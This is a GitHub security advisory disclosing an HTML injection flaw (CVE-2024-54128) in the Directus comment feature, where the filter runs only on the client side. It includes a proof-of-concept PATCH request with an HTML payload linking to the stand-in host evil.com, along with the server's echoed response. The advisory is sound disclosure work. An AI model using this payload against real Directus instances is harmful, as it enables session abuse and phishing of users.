# [M] Directus has an HTML Injection in Comment

## Summary
Severity: Medium
Advisory: GHSA-r6wx-627v-gh2f
CVE: CVE-2024-54128
CWE: CWE-80
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-12-05
Source: https://github.com/advisories/GHSA-r6wx-627v-gh2f
Type: github-advisory

## Affected
- npm: `@directus/app` — affected >=11.0.0 <13.3.1
- npm: `directus` — affected >=10.10.0 <10.13.4
- npm: `directus` — affected >=11.0.0-rc.1 <11.2.2

## Details
### Summary
The Comment feature has implemented a filter to prevent users from adding restricted characters, such as HTML tags. However, this filter operates on the client-side, which can be bypassed, making the application vulnerable to HTML Injection.

### Details
The Comment feature implements a character filter on the client-side, this can be bypassed by directly sending a request to the endpoint.

Example Request:

```
PATCH /activity/comment/3 HTTP/2
Host: directus.local

{
  "comment": "<h1>TEST <p style=\"color:red\">HTML INJECTION</p> <a href=\"//evil.com\">Test Link</a></h1>"
}
```

Example Response:

```json
{
  "data": {
    "id": 3,
    "action": "comment",
    "user": "288fdccc-399a-40a1-ac63-811bf62e6a18",
    "timestamp": "2023-09-06T02:23:40.740Z",
    "ip": "10.42.0.1",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "collection": "directus_files",
    "item": "7247dda1-c386-4e7a-8121-7e9c1a42c15a",
    "comment": "<h1>TEST <p style=\"color:red\">HTML INJECTION</p> <a href=\"//evil.com\">Test Link</a></h1>",
    "origin": "https://directus.local",
    "revisions": []
  }
}
```

Example Result:

![Screenshot 2023-09-06 094536](https://user-images.githubusercontent.com/61263002/265876100-12e068fe-3d53-41b4-bfcb-458c2bc2a638.png)

## Impact

With the introduction of session cookies this issue has become exploitable as a malicious script is now able to do authenticated actions on the current users behalf.

## References
- https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f
- https://nvd.nist.gov/vuln/detail/CVE-2024-54128
- https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633
- https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d
- https://github.com/directus/directus
